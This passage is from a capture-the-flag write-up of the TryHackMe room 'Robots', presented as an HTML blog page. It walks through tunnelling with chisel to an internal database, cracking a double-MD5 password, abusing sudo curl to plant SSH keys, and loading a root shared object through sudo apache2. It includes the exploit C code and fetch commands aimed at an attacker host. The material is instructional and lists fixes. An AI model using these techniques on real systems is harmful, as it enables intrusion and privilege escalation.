+    <p>With busybox's <code>nc</code> (which reports <code>open</code>, not GNU netcat's <code>succeeded</code>), sweep the <code>/24</code> for anything listening on 3306:</p>
+    <pre><code><div class="ph"><span class="pl">container — internal port sweep</span><div class="pd"><span style="background:#ff5f57"></span><span style="background:#ffbd2e"></span><span style="background:#28ca41"></span></div></div>
+<span class="cp">for</span> i <span class="cp">in</span> $(seq 1 254); <span class="cp">do</span>
+  /tmp/busybox nc -zw1 172.18.0.$i 3306 2&gt;/dev/null &amp;&amp; <span class="cp">echo</span> <span class="cs">"172.18.0.$i:3306 OPEN"</span>
+<span class="cp">done</span>
+<span class="cg">172.18.0.2:3306 OPEN</span></code></pre>
+    <div class="shot">
+      <div class="sh"><span class="sl">container — /etc/hosts, tooling upload, subnet sweep</span><span class="ss">172.18.0.2 found</span></div>
+      <img src="robots13.png" alt="Container shell: /etc/hosts shows 172.18.0.3 robots.thm; ss/ip/ifconfig all not found; curl downloads chisel and busybox from the attack box; file /tmp/nc reports HTML document; busybox nc sweep of 172.18.0.0/24 finds 172.18.0.2:3306 OPEN" loading="lazy" />
+      <div class="sc">This container is <code>.3</code>; the real MySQL is <code>172.18.0.2</code>. The missing standard tools and the saved 404-as-nc are all visible here.</div>
+    </div>
+    <p>The database is <code>172.18.0.2</code>, not <code>.3</code> (that's the web container itself). Start the chisel server on the attack box and dial back a reverse tunnel that forwards my local 3306 straight to the DB container:</p>
+    <pre><code><div class="ph"><span class="pl">attack box</span><div class="pd"><span style="background:#ff5f57"></span><span style="background:#ffbd2e"></span><span style="background:#28ca41"></span></div></div>
+./chisel server --reverse --port 51234</code></pre>
+    <pre><code><div class="ph"><span class="pl">container</span><div class="pd"><span style="background:#ff5f57"></span><span style="background:#ffbd2e"></span><span style="background:#28ca41"></span></div></div>
+/tmp/chisel client 192.168.128.12:51234 R:3306:172.18.0.2:3306</code></pre>
+    <div class="callout red"><strong>A clean TCP handshake through a tunnel does not prove the tunnel reaches the right backend.</strong> My first attempt forwarded <code>R:3306:172.18.0.3:3306</code> — this container's own IP. <code>nc -zv 127.0.0.1 3306</code> reported success, but no MySQL greeting banner ever arrived, because nothing listens on <code>.3:3306</code>. Always confirm a protocol-level response — e.g. <code>timeout 3 nc 127.0.0.1 3306 | xxd | head</code> should show a MySQL handshake — before trusting a tunnel end-to-end.</div>
+  </section>
+
+  <!-- ── 08 DB ── -->
+  <section class="section" id="database">
+    <div class="s-num">08</div>
+    <h2>Database → rgiskard's Credentials</h2>
+    <p>Through the tunnel, connect as if MySQL were local:</p>
+    <pre><code><div class="ph"><span class="pl">attack box — through the tunnel</span><div class="pd"><span style="background:#ff5f57"></span><span style="background:#ffbd2e"></span><span style="background:#28ca41"></span></div></div>
+mysql -h 127.0.0.1 -P 3306 -u robots -p
+<span class="ck"># password: q4qCz1OflKvKwK4S</span>
+MariaDB [(none)]&gt; <span class="ca">use web;</span>
+MariaDB [web]&gt; <span class="ca">SELECT * FROM users;</span></code></pre>
+    <div class="shot">
+      <div class="sh"><span class="sl">MariaDB [web] — users table</span><span class="ss">4 rows</span></div>
+      <img src="robots14.png" alt="MariaDB users table dump: id 1 admin, id 2 rgiskard with hash dfb35334bf2a1338fa40e5fbb4ae4753 group nologin, and ids 3 and 7 whose usernames are the injected script-tag XSS payloads" loading="lazy" />
+      <div class="sc">The injected <code>&lt;script&gt;</code> usernames are stored verbatim (rows 3 and 7) — proof the field was never sanitised. Row 2, <code>rgiskard</code>, is the target.</div>
+    </div>
+    <p>The <code>users</code> table stores <code>rgiskard</code> with hash <code>dfb35334bf2a1338fa40e5fbb4ae4753</code>. It's not a plain <code>md5(username+ddmm)</code> — the app double-hashes: <code>md5(md5(username + ddmm))</code>. Same date space as before (366 candidates), so the same offline loop cracks it in milliseconds, this time hashing twice before comparing:</p>
+    <pre><code><div class="ph"><span class="pl">hash.py — crack double-MD5</span><div class="pd"><span style="background:#ff5f57"></span><span style="background:#ffbd2e"></span><span style="background:#28ca41"></span></div></div>
+<span class="cp">import</span> hashlib, sys
+
+user, target = sys.argv[1], sys.argv[2]
+<span class="cp">for</span> d <span class="cp">in</span> <span class="cp">range</span>(1, 32):
+    <span class="cp">for</span> m <span class="cp">in</span> <span class="cp">range</span>(1, 13):
+        ddmm  = <span class="cs">f"{d:02d}{m:02d}"</span>
+        first = hashlib.md5((user + ddmm).encode()).hexdigest()
+        <span class="cp">if</span> hashlib.md5(first.encode()).hexdigest() == target:
+            <span class="cp">print</span>(<span class="cs">f"[+] {user}{ddmm}  ->  md5={first}"</span>); sys.exit()</code></pre>
+    <pre><code><div class="ph"><span class="pl">attack box</span><div class="pd"><span style="background:#ff5f57"></span><span style="background:#ffbd2e"></span><span style="background:#28ca41"></span></div></div>
+python3 hash.py rgiskard dfb35334bf2a1338fa40e5fbb4ae4753
+<span class="cg">[+] rgiskard2209  ->  md5=b246[...redacted...]</span></code></pre>
+    <p>The recovered password is the single-MD5 pre-image the app used as the actual login secret — <code>md5("rgiskard" + "2209")</code>. It's reused for SSH.</p>
+    <pre><code><div class="ph"><span class="pl">attack box</span><div class="pd"><span style="background:#ff5f57"></span><span style="background:#ffbd2e"></span><span style="background:#28ca41"></span></div></div>
+ssh rgiskard@robots.thm</code></pre>
+    <div class="shot">
+      <div class="sh"><span class="sl">rgiskard@ubuntu-jammy — host shell</span><span class="ss">user.txt reach</span></div>
+      <img src="robots15.png" alt="SSH session as rgiskard@ubuntu-jammy: id shows uid 1002 rgiskard, ls -la of the home directory showing .bash_logout, .bashrc, .profile" loading="lazy" />
+      <div class="sc">SSH lands on the <em>host</em> (<code>ubuntu-jammy</code>), not the container — the reused DB-scheme password gets us onto the box itself as <code>rgiskard</code>.</div>
+    </div>
+  </section>
+
+  <!-- ── 09 rgiskard → dolivaw ── -->
+  <section class="section" id="curl">
+    <div class="s-num">09</div>
+    <h2>rgiskard → dolivaw — sudo curl Config Abuse</h2>
+    <pre><code><div class="ph"><span class="pl">rgiskard@ubuntu-jammy</span><div class="pd"><span style="background:#ff5f57"></span><span style="background:#ffbd2e"></span><span style="background:#28ca41"></span></div></div>
+sudo -l
+<span class="cg">User rgiskard may run the following commands on ubuntu-jammy:
+    (dolivaw) /usr/bin/curl 127.0.0.1/*</span></code></pre>
+    <p>The sudoers rule only checks the <strong>positional URL argument</strong> against <code>127.0.0.1/*</code>. It says nothing about flags — and <code>curl</code> takes a <code>-K &lt;file&gt;</code> option that reads additional configuration from a file, including where to send output. So the positional argument can stay compliant while a config file redirects the real behaviour: read a local file, and write it wherever I like — including <code>dolivaw</code>'s <code>authorized_keys</code>.</p>
+    <p>Generate a keypair on the attack box, place the <em>public</em> key on target, and let sudo-curl write it into dolivaw's <code>.ssh</code>:</p>
+    <pre><code><div class="ph"><span class="pl">attack box</span><div class="pd"><span style="background:#ff5f57"></span><span style="background:#ffbd2e"></span><span style="background:#28ca41"></span></div></div>
+ssh-keygen -t ed25519 -f ./dolivaw_key -N <span class="cs">""</span>
+cat dolivaw_key.pub</code></pre>
+    <pre><code><div class="ph"><span class="pl">target — as rgiskard</span><div class="pd"><span style="background:#ff5f57"></span><span style="background:#ffbd2e"></span><span style="background:#28ca41"></span></div></div>
+<span class="cp">echo</span> <span class="cs">"ssh-ed25519 AAAA...&lt;your pubkey&gt;..."</span> &gt; /tmp/key.txt
+
+cat &gt; /tmp/curlrc &lt;&lt; <span class="cs">'EOF'</span>
+url        = <span class="cs">"file:///tmp/key.txt"</span>
+output     = <span class="cs">"/home/dolivaw/.ssh/authorized_keys"</span>
+create-dirs
+<span class="cs">EOF</span>
+
+<span class="ck"># positional URL matches 127.0.0.1/*; -K redirects the real read/write</span>
+sudo -u dolivaw curl 127.0.0.1/x -o /dev/null -K /tmp/curlrc</code></pre>
+    <pre><code><div class="ph"><span class="pl">attack box — log in as dolivaw</span><div class="pd"><span style="background:#ff5f57"></span><span style="background:#ffbd2e"></span><span style="background:#28ca41"></span></div></div>
+chmod 600 dolivaw_key
+ssh dolivaw@robots.thm -i dolivaw_key</code></pre>
+    <div class="shot">
+      <div class="sh"><span class="sl">dolivaw@ubuntu-jammy</span><span class="ss">user.txt</span></div>
+      <img src="robots16.png" alt="SSH session as dolivaw@ubuntu-jammy: id shows uid 1003 dolivaw, ls -la of home directory showing .ssh directory and user.txt owned by root" loading="lazy" />
+      <div class="sc">Key-based login as <code>dolivaw</code> — and <code>user.txt</code> is here.</div>
+    </div>
+    <div class="callout blue"><strong>Wildcarded sudo rules only validate the literal argument shown.</strong> <code>curl 127.0.0.1/*</code> looks tightly scoped, but <code>-K</code>, <code>-o</code>, <code>--config</code> and friends aren't part of the pattern. When a binary can read a config file or write output to an arbitrary path, a positional-only match is not a real restriction.</div>
+  </section>
+
+  <!-- ── 10 dolivaw → root ── -->
+  <section class="section" id="root">
+    <div class="s-num">10</div>
+    <h2>dolivaw → root — sudo apache2 Module Load</h2>
+    <pre><code><div class="ph"><span class="pl">dolivaw@ubuntu-jammy</span><div class="pd"><span style="background:#ff5f57"></span><span style="background:#ffbd2e"></span><span style="background:#28ca41"></span></div></div>
+sudo -l
+<span class="cg">User dolivaw may run the following commands on ubuntu-jammy:
+    (ALL) NOPASSWD: /usr/sbin/apache2</span></code></pre>
+    <p>This is the <a href="https://gtfobins.github.io/gtfobins/apache2/#sudo" target="_blank" rel="noopener">GTFOBins apache2 sudo</a> vector: Apache can <code>LoadModule</code> an arbitrary shared object, and it loads it as root. Two details make the stock one-liner fail here, and both are worth understanding rather than copy-pasting past.</p>
+    <p><strong>(1)</strong> Apache doesn't just <code>dlopen()</code> the <code>.so</code> — it looks up a <em>module-structure symbol</em> whose name matches the name given in <code>LoadModule &lt;name&gt; &lt;path&gt;</code>. A constructor-only shared object fires its payload but then errors out with <code>undefined symbol</code>. So the C pairs a constructor (which does the actual work) with a dummy exported symbol named after the module.</p>
+    <pre><code><div class="ph"><span class="pl">rootshell.c</span><div class="pd"><span style="background:#ff5f57"></span><span style="background:#ffbd2e"></span><span style="background:#28ca41"></span></div></div>
+<span class="cp">#include</span> <span class="cs">&lt;stdlib.h&gt;</span>
+<span class="cp">#include</span> <span class="cs">&lt;unistd.h&gt;</span>
+
+<span class="ca">__attribute__ ((constructor))</span>
+<span class="cp">void</span> <span class="cy">x</span>() {
+  setuid(0); setgid(0);
+  system(<span class="cs">"chmod +s /bin/bash"</span>);   <span class="ck">// SUID root bash</span>
+}
+
+<span class="cp">void</span> *x_module;   <span class="ck">// satisfies Apache's LoadModule x_module symbol lookup</span></code></pre>
+
+    <h3>Transferring the exploit — no gcc on target</h3>
+    <p>The box has no compiler, so the module is built on the attack box and shipped over. Compile a shared object locally, serve it, and pull it down with the one download tool the host reliably has:</p>
+    <pre><code><div class="ph"><span class="pl">attack box — compile + serve</span><div class="pd"><span style="background:#ff5f57"></span><span style="background:#ffbd2e"></span><span style="background:#28ca41"></span></div></div>
+<span class="ck"># build the module locally — target has no gcc</span>
+gcc -shared -fPIC rootshell.c -o rootshell.so
+
+<span class="ck"># serve it from the directory holding rootshell.so</span>
+python3 -m http.server 8001</code></pre>
+    <pre><code><div class="ph"><span class="pl">target — as dolivaw, fetch + verify</span><div class="pd"><span style="background:#ff5f57"></span><span style="background:#ffbd2e"></span><span style="background:#28ca41"></span></div></div>
+curl -o /tmp/rootshell.so http://192.168.128.12:8001/rootshell.so
+
+<span class="ck"># confirm it's really an ELF shared object, not a saved 404 page</span>
+file /tmp/rootshell.so
+<span class="cg">/tmp/rootshell.so: ELF 64-bit LSB shared object, x86-64, dynamically linked</span>
+chmod +x /tmp/rootshell.so</code></pre>
+    <div class="callout yellow"><strong>If <code>curl</code> is missing too, the alternatives all fit the same pattern.</strong> <code>wget -O /tmp/rootshell.so http://192.168.128.12:8001/rootshell.so</code>; or over the SSH session already open, <code>scp ./rootshell.so dolivaw@robots.thm:/tmp/</code> from the attack box; or, with nothing but bash, <code>cat &lt; /dev/tcp/192.168.128.12/8001</code> after a manual HTTP request. Always <code>file</code> the result before loading it — a 404 saved as a <code>.so</code> will fail Apache's symbol lookup for the wrong reason and waste time.</div>
+
+    <p><strong>(2)</strong> Apache's config references variables like <code>${APACHE_RUN_DIR}</code> that are normally set by <code>envvars</code> — absent under a bare <code>sudo</code> invocation. The fix is <code>-C</code> (pre-config, parsed <em>before</em> <code>apache2.conf</code>) to define the variable, not <code>-c</code> (parsed after). Load the module foreground with <code>-X</code>:</p>
+    <pre><code><div class="ph"><span class="pl">target — as dolivaw</span><div class="pd"><span style="background:#ff5f57"></span><span style="background:#ffbd2e"></span><span style="background:#28ca41"></span></div></div>
+sudo /usr/sbin/apache2 -X \
+  -C <span class="cs">"Define APACHE_RUN_DIR /var/run/apache2"</span> \
+  -c <span class="cs">"LoadModule x_module /tmp/rootshell.so"</span></code></pre>
+    <p>The constructor runs as root before Apache finishes parsing — the later <code>undefined symbol</code> / config warnings are cosmetic, the SUID bit is already set. Collect root:</p>
+    <pre><code><div class="ph"><span class="pl">target — as dolivaw</span><div class="pd"><span style="background:#ff5f57"></span><span style="background:#ffbd2e"></span><span style="background:#28ca41"></span></div></div>
+ls -la /bin/bash
+<span class="cg">-rwsr-sr-x 1 root root 1396520 /bin/bash</span>   <span class="ck"># the s bit landed</span>
+/bin/bash -p
+<span class="cg">bash-5.1# id
+uid=1003(dolivaw) gid=1003(dolivaw) euid=0(root) egid=0(root) groups=0(root),1003(dolivaw)</span>
+cat /root/root.txt</code></pre>
+    <div class="shot">
+      <div class="sh"><span class="sl">dolivaw → root</span><span class="ss">euid=0</span></div>
+      <img src="robots17.png" alt="Terminal: sudo apache2 with -C Define APACHE_RUN_DIR and -c LoadModule x_module rootshell.so, config warnings and an undefined symbol x_module error, then ls -la /bin/bash showing -rwsr-sr-x, then /bin/bash -p giving euid=0 root, and cat /root/root.txt" loading="lazy" />
+      <div class="sc">Despite the <code>undefined symbol: x_module</code> error, the constructor already ran as root — <code>/bin/bash</code> is now SUID, and <code>-p</code> gives <code>euid=0</code>.</div>
+    </div>
+    <div class="callout green"><strong>The fixes:</strong> don't grant <code>NOPASSWD</code> on binaries that load arbitrary code (<code>apache2</code>, <code>curl</code>, and anything on GTFOBins); scope sudo rules to fully-argument-matched commands, never wildcards over a single positional argument; and never bind an application secret into a config the web root can read. Each rule in this chain looked narrow in isolation.</div>
+  </section>
+
+  <!-- ── 11 CHAIN ── -->
+  <section class="section" id="chain">
+    <div class="s-num">11</div>
+    <h2>Chain Summary &amp; Takeaways</h2>
+    <div class="chain">
+      <div class="chain-row">
+        <span class="chain-arrow">01</span>
+        <span class="chain-bug">robots.txt disclosure</span>
+        <span class="chain-gives">hidden path <code>/harm/to/self/</code> — the only one not 403</span>
+      </div>
+      <div class="chain-row">
+        <span class="chain-arrow">02</span>
+        <span class="chain-bug">register.php hint</span>
+        <span class="chain-gives">password scheme + "an admin monitors new users" (the real vector)</span>
+      </div>
+      <div class="chain-row">
+        <span class="chain-arrow">03</span>
+        <span class="chain-bug">stored XSS in username</span>
+        <span class="chain-gives">admin's browser runs attacker JS on review</span>
+      </div>
+      <div class="chain-row">
+        <span class="chain-arrow">04</span>
+        <span class="chain-bug">same-origin XHR vs HttpOnly</span>
+        <span class="chain-gives">PHPSESSID exfiltrated via phpinfo body → admin session</span>
+      </div>
+      <div class="chain-row">
+        <span class="chain-arrow">05</span>
+        <span class="chain-bug">admin.php SSRF</span>
+        <span class="chain-gives">server-side fetch of hosted shell.php → RCE as www-data</span>
+      </div>
+      <div class="chain-row">
+        <span class="chain-arrow">06</span>
+        <span class="chain-bug">config.php → $servername=db</span>
+        <span class="chain-gives">DB creds + Docker Compose topology revealed</span>
+      </div>
+      <div class="chain-row">
+        <span class="chain-arrow">07</span>
+        <span class="chain-bug">chisel reverse tunnel</span>
+        <span class="chain-gives">reach internal MariaDB at 172.18.0.2 from attack box</span>
+      </div>
+      <div class="chain-row">
+        <span class="chain-arrow">08</span>
+        <span class="chain-bug">double-MD5 + date space</span>
+        <span class="chain-gives">rgiskard cracked → SSH to the host (password reuse)</span>
+      </div>
+      <div class="chain-row">
+        <span class="chain-arrow">09</span>
+        <span class="chain-bug">sudo curl -K config abuse</span>
+        <span class="chain-gives">write authorized_keys → SSH as dolivaw</span>
+      </div>
+      <div class="chain-row">
+        <span class="chain-arrow">10</span>
+        <span class="chain-bug">sudo apache2 LoadModule</span>
+        <span class="chain-gives">root-loaded .so sets SUID bash → root</span>
+      </div>
+    </div>
+
+    <div class="steps">
+      <div class="step"><div class="sn">T1</div><div class="sb"><strong>Read the whole hint, not the loud half.</strong> "Passwords are <code>md5(username+ddmm)</code>" screams brute-force; "an admin monitors new users" whispers stored XSS. The room gives both on one page and rewards the quiet one. An hour on the rabbit hole was the tuition.</div></div>
+      <div class="step"><div class="sn">T2</div><div class="sb"><strong>HttpOnly stops JS reading a cookie, not the browser sending it.</strong> When <code>document.cookie</code> is empty, pivot to a same-origin authenticated request against any page that reflects the session — here phpinfo — and exfiltrate the response instead of the cookie object.</div></div>
+      <div class="step"><div class="sn">T3</div><div class="sb"><strong>SSRF that fetches arbitrary URLs is RCE waiting for a payload host.</strong> Prove it with <code>file://</code> first, then point it at a reverse shell you serve — the server-side fetch does the execution for you.</div></div>
+      <div class="step"><div class="sn">T4</div><div class="sb"><strong>A service name in a config is network topology.</strong> <code>$servername = "db"</code> plus a phpinfo "Docker" build line means the DB is another container — don't burn time trying to reach it directly; tunnel to it. And verify a tunnel with a protocol banner, never a bare TCP connect.</div></div>
+      <div class="step"><div class="sn">T5</div><div class="sb"><strong>Wildcarded sudo rules match one argument, not the whole command.</strong> <code>curl 127.0.0.1/*</code> and <code>apache2</code> both look constrained; <code>-K</code> and <code>LoadModule</code> walk right past the constraint. Any sudo binary that reads config files or loads code is effectively unrestricted.</div></div>
+      <div class="step"><div class="sn">T6</div><div class="sb"><strong>Minimal targets mean bring your own tools — and check what you dropped.</strong> No <code>wget</code>/<code>nc</code>/<code>gcc</code> is normal on a container; <code>curl</code> + a static busybox + a locally-compiled <code>.so</code> cover it. Always <code>file</code> the download — a 404 saved as your binary fails for the wrong reason and eats time.</div></div>
+    </div>
+
+    <div class="callout yellow"><strong>Flags and room answers redacted.</strong> TryHackMe's terms prohibit publishing room answers, so <code>user.txt</code>, <code>root.txt</code> and the recovered date/hash are kept out. Every command above reproduces them against a live instance — which is the part worth having.</div>
+  </section>
+
+</main>
+
+<aside class="toc">
+  <div class="toc-label">Contents</div>
+  <ul>
+    <li><a href="#recon">01 — Recon</a></li>
+    <li><a href="#enum">02 — Enumeration</a></li>
+    <li><a href="#rabbithole">03 — Rabbit Hole</a></li>
+    <li><a href="#xss">04 — Stored XSS</a></li>
+    <li><a href="#ssrf">05 — SSRF → RCE</a></li>
+    <li><a href="#loot">06 — config.php</a></li>
+    <li><a href="#pivot">07 — Docker Pivot</a></li>
+    <li><a href="#database">08 — Database</a></li>
+    <li><a href="#curl">09 — sudo curl</a></li>
+    <li><a href="#root">10 — sudo apache2</a></li>
+    <li><a href="#chain">11 — Chain Summary</a></li>
+  </ul>
+</aside>
+</div>
+
+<footer>
+  <div class="footer-inner">
+    <span class="footer-copy">© 2025 Maks Huseynli</span>
+    <div class="footer-links">
+      <a href="../index.html">Home</a>
+      <a href="../methodology.html">Methodology</a>
+      <a href="../about.html">About</a>
+    </div>
+  </div>
+</footer>
+
+</body>
+</html>
